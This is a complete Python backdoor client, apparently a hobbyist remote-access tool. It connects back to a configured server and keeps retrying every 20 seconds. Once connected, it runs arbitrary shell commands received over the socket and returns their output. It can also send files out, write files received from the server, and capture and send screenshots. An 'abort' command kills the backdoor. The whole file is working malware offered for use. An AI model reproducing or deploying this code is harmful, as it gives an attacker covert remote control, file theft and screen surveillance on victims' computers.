import socket, time, json
import subprocess # Executing command processes
import os # Executing commands 
import pyautogui  # For taking screenshots
import io 

######### Configure Here #########
SERVER_IP = '192.168.1.1' # Server IP 
PORT = 5555 # Server's listening port

ABORT = False # Abort flag

# Send client response back to server
def send_data(data):
    if isinstance(data, bytes):
        s.send(data)
    else:
        json_data = json.dumps(data) 
        s.send(json_data.encode()) # Encode and send the data

# Receives command from server
def recv_data():
    data = ''
    while True:
        try: # If json return a incomplete data a ValueError is raised and 
             # the loop executes again append the rest of the packet
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
        
# Attempts to connect to server every 20 seconds
def connection():
    while True:  
        try:
            s.connect((SERVER_IP,PORT)) # Attempt connection
            shell() # Initiates Shell
            s.close() # Close socket
            break;
        except:
            time.sleep(20)
            continue 

# Uploads file to server
def upload_file(file_name):
    file = open(file_name, 'rb') # Open file in "read bytes(rb)" mode
    s.send(file.read())

# Downlaods file from server
def download_file(file_name):
    s.settimeout(1) # Set timeout to prevent crashing
    chunk = s.recv(1024) # Receive file contents
    
    if not chunk:
        s.settimeout(None) # Remove timeout
        return

    file = open(file_name,'wb') # Open file in "write bytes (wb)" mode 
    while chunk: # Executes as long as there is data in chunk var
        file.write(chunk)
        try: 
            chunk = s.recv(1024) # Receive file contents
        except socket.timeout as e:
            break
    s.settimeout(None) # Remove timeout
    file.close() # Close the file

# Takes and send a screenshot
def send_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot_bytes = io.BytesIO()
    screenshot.save(screenshot_bytes, format = 'PNG')
    screenshot_bytes.seek(0)
    send_data(screenshot_bytes.read())
        
def shell():
    global ABORT    
    while True:
        try:
            command = recv_data() # Receive command
            if command == 'quit': # End the session
                break
            elif command == 'abort': # Kill the backdoor
                ABORT = True
                break
            elif command[:3] == 'cd ': # Change directory
                os.chdir(command[3:]) 
            elif command == 'clear': # Server side command
                pass
            elif command[:9] == 'download ': # Server side download request
                upload_file(command[9:]) # Upload file to server
            elif command[:7] == 'upload ': # Server side upload request
                download_file(command[7:])# Download file from server
            elif command[:11] == 'screenshot ': # Screenshot command
                send_screenshot()
            else: # Execute the command on the client
                    # PIPE holds the subprocess data to be relayed to/from the server
                execute = subprocess.Popen(command, shell = 1, stdout=subprocess.PIPE, 
                                       stderr = subprocess.PIPE, stdin = subprocess.PIPE)
                result = (execute.stdout.read() + execute.stderr.read()).decode()
                send_data(result) # Send the result of the command back to the server
        except:
            continue
    
while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create socket
    connection() # Initiate the connection
    if ABORT: # Kill the backdoor
        break
    time.sleep(20)
